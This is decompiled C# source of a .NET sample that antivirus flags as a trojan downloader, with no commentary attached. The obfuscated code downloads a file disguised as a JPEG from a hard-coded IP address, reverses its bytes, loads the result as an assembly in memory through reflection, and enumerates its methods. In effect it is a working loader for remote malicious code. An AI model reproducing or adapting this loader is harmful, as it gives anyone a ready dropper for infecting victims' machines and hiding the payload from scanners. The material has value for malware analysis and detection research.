// Decompiled with JetBrains decompiler
// Type: .
// Assembly: hbatka, Version=4.7.9.11, Culture=neutral, PublicKeyToken=null
// MVID: 660054C3-DA61-449E-AE4B-0631D970FFF1
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Downloader.MSIL.PsDownload.gen-7e6cd2bf820d81c9389c549cfe482bcdb1b57c5f39d53b63cd1efb79699e7ae6.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;

namespace \u0001
{
  internal static class \u0001
  {
    [STAThread]
    public static void \u0001()
    {
      while (true)
      {
        try
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          while (false)
            ;
        }
        catch
        {
          while (false)
            ;
        }
        if (true)
        {
          if (true)
            goto label_9;
label_8:
          break;
label_9:
          \u0002.\u0001.\u0001();
          goto label_8;
        }
      }
    }

    private static byte[] \u0001()
    {
      if (false)
        goto label_3;
label_1:
      byte[] numArray1 = (byte[]) typeof (WebClient).GetMethod("DownloadData", new Type[1]
      {
        typeof (Uri)
      }).Invoke((object) new WebClient(), new object[1]
      {
        (object) new Uri("http://91.243.44.75/hbatka.jpeg")
      });
label_3:
      byte[] numArray2 = numArray1;
      if (true)
        return numArray2;
      goto label_1;
    }

    internal static MethodInfo[] \u0001()
    {
      MethodInfo[] array;
      do
      {
        List<MethodInfo> methodInfoList1 = new List<MethodInfo>();
        List<MethodInfo> methodInfoList2;
        if (true)
          methodInfoList2 = methodInfoList1;
        List<Type> typeList;
        do
        {
          typeList = new List<Type>();
        }
        while (false);
        typeList.AddRange((IEnumerable<Type>) \u0001.\u0001.Assembly.GetExportedTypes());
        do
          ;
        while (false);
        List<Type>.Enumerator enumerator = typeList.GetEnumerator();
        try
        {
label_5:
          if (enumerator.MoveNext())
          {
            Type current = enumerator.Current;
            do
            {
              methodInfoList2.AddRange((IEnumerable<MethodInfo>) current.GetMethods());
            }
            while (false);
            goto label_5;
          }
        }
        finally
        {
          do
          {
            enumerator.Dispose();
          }
          while (false);
        }
        array = methodInfoList2.ToArray();
      }
      while (false);
      return array;
    }

    private static Assembly Assembly
    {
      get
      {
        Assembly assembly;
        if (true)
          assembly = (Assembly) typeof (Assembly).GetMethod("Load", new Type[1]
          {
            typeof (byte[])
          }).Invoke((object) null, new object[1]
          {
            (object) ((IEnumerable<byte>) \u0001.\u0001.\u0001()).Reverse<byte>().ToArray<byte>()
          });
        if (false)
          ;
        return assembly;
      }
    }
  }
}
